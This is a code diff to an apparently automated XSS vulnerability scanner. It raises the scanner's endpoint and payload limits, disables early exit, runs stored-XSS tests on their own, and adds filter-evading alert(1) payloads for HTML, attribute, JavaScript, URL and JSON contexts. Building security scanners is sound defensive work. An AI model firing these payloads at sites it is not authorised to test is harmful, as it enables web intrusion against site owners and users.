@@ -39,11 +39,11 @@ class XSSContext(str, Enum):
 @dataclass
 class XSSAgentConfig:
     """Configuration for XSS testing."""
-    MAX_ENDPOINTS: int = 20
-    MAX_PAYLOADS_PER_PARAM: int = 10
-    MAX_PARAMS_PER_ENDPOINT: int = 5
-    BATCH_SIZE: int = 3
-    EARLY_EXIT_ON_FIRST_VULN: bool = True
+    MAX_ENDPOINTS: int = 50                  # Increased from 20 — test more endpoints
+    MAX_PAYLOADS_PER_PARAM: int = 15         # Increased from 10 — broader payload coverage
+    MAX_PARAMS_PER_ENDPOINT: int = 8         # Increased from 5 — test more params per endpoint
+    BATCH_SIZE: int = 5                      # Increased from 3 — faster concurrent testing
+    EARLY_EXIT_ON_FIRST_VULN: bool = False   # Disabled — find ALL vulns, not just the first one
     STORED_XSS_RETRIEVAL_DELAY: float = 1.0
     DOM_XSS_CONFIDENCE_THRESHOLD: int = 60
 
@@ -105,7 +105,6 @@ class XSSAgent(BaseSecurityAgent, WAFEvasionMixin):
         VulnerabilityType.XSS_DOM
     ]
 
-    # Context-specific payloads
     CONTEXT_PAYLOADS = {
         XSSContext.HTML_BODY: [
             "<script>alert('XSS')</script>",
@@ -116,6 +115,12 @@ class XSSAgent(BaseSecurityAgent, WAFEvasionMixin):
             "<details open ontoggle=alert('XSS')>",
             "<marquee onstart=alert('XSS')>",
             "<video><source onerror=alert('XSS')>",
+            "<svg/onload=alert(1)>",
+            "<img/src=x/onerror=alert(1)>",
+            "<details/open/ontoggle=alert(1)>",
+            "<script/src=data:,alert(1)></script>",
+            "<iframe/src=javascript:alert(1)>",
+            "<object data=javascript:alert(1)>",
         ],
         XSSContext.HTML_ATTRIBUTE: [
             "\" onmouseover=\"alert('XSS')\"",
@@ -126,6 +131,9 @@ class XSSAgent(BaseSecurityAgent, WAFEvasionMixin):
             "\">' <script>alert(1)</script>",
             "'> <img src=x onerror=alert(1)>",
             "' accesskey='x' onclick='alert(1)'",
+            "\"/onmouseover=\"alert(1)",
+            "'/onfocus='alert(1)'/autofocus='",
+            "\"/onerror=\"alert(1)",
         ],
         XSSContext.JAVASCRIPT: [
             "';alert('XSS');//",
@@ -136,6 +144,8 @@ class XSSAgent(BaseSecurityAgent, WAFEvasionMixin):
             "'-alert(1)-'",
             "\"-alert(1)-\"",
             "\\x27;alert(1);//",
+            "';alert(1);'",
+            "//\\nimport('data:text/javascript,alert(1)');",
         ],
         XSSContext.URL: [
             "javascript:alert('XSS')",
@@ -143,6 +153,8 @@ class XSSAgent(BaseSecurityAgent, WAFEvasionMixin):
             "javascript:alert(String.fromCharCode(88,83,83))",
             "vbscript:alert('XSS')",
             "javascript:eval('alert(1)')",
+            "javascript://%0d%0aalert(1)",
+            "javascript:alert`1`",
         ],
         XSSContext.CSS: [
             "expression(alert('XSS'))",
@@ -155,6 +167,7 @@ class XSSAgent(BaseSecurityAgent, WAFEvasionMixin):
             "\"},\"xss\":\"<script>alert(1)</script>",
             "\\u0027;alert(1);//",
             "\";alert(1);//",
+            "\"},\"a\":alert(1),\"b\":{\"",
         ]
     }
 
@@ -689,7 +702,7 @@ class XSSAgent(BaseSecurityAgent, WAFEvasionMixin):
         self,
         target_url: str,
         endpoints: List[Dict[str, Any]],
-        technology_stack: List[str] = None,
+        technology_stack: Optional[List[str]] = None,
         scan_context: Optional["ScanContext"] = None
     ) -> List[AgentResult]:
         """
@@ -767,8 +780,8 @@ class XSSAgent(BaseSecurityAgent, WAFEvasionMixin):
                         logger.info(f"Found vulnerability in {param_name}, skipping remaining params")
                         break
 
-                # Test stored XSS (more invasive)
-                if not reflected_result and method.upper() in ["POST", "PUT"]:
+                # Test stored XSS (run independently — a param can be both reflected and stored)
+                if method.upper() in ["POST", "PUT", "PATCH"]:
                     stored_result = await self._test_stored_xss(
                         url, method, params, param_name
                     )
